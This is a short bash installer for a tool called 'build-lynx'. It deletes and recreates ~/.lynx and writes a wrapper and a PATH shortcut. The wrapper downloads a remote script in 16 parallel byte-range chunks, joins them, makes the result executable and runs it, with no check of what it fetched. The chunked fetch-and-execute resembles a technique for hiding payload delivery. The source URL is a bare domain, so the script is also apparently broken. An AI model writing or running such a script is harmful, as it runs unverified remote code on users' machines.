#!/usr/bin/env bash

set -e

# 1. Clean and recreate directories
rm -rf ~/.lynx ~/.local/bin/build-lynx
mkdir -p ~/.lynx ~/.local/bin

# 2. Optimized wrapper script with 16 parts
cat > ~/.lynx/build-lynx.sh <<'EOF'
#!/usr/bin/env bash
set -e

URL="https://githubusercontent.com"
OUT_DIR="$HOME/.lynx/chunks"
rm -rf "$OUT_DIR" && mkdir -p "$OUT_DIR"

# Total size estimation divided into 16 sequential blocks
# Format: index:start-end
CHUNKS=(
  "01:0-199" "02:200-399" "03:400-559" "04:560-719"
  "05:720-879" "06:880-1039" "07:1040-1199" "08:1200-1359"
  "09:1360-1519" "10:1520-1679" "11:1680-1839" "12:1840-1999"
  "13:2000-2159" "14:2160-2319" "15:2320-2479" "16:2480-"
)

# Download 16 chunks simultaneously (-P 16 maximizes multi-threading)
# Uses the prefix index (e.g., 01, 02) to maintain proper ordering
printf "%s\n" "${CHUNKS[@]}" | xargs -I {} -P 16 bash -c '
  INDEX=$(echo "{}" | cut -d: -f1)
  RANGE=$(echo "{}" | cut -d: -f2)
  curl -fsSL -r "$RANGE" "'"$URL"'" -o "'"$OUT_DIR"'/part_$INDEX"
'

# Recombine chunks in strict sequential order
cat "$OUT_DIR"/part_* > "$HOME/.lynx/final-build.sh"
chmod +x "$HOME/.lynx/final-build.sh"

# Execute
exec "$HOME/.lynx/final-build.sh" "$@"
EOF

chmod +x ~/.lynx/build-lynx.sh

# 3. Create the bin shortcut
cat > ~/.local/bin/build-lynx <<'EOF'
#!/usr/bin/env bash
exec "$HOME/.lynx/build-lynx.sh" "$@"
EOF

chmod +x ~/.local/bin/build-lynx

# 4. Run
export PATH="$HOME/.local/bin:$PATH"

echo "Installed."
echo "Running..."
build-lynx
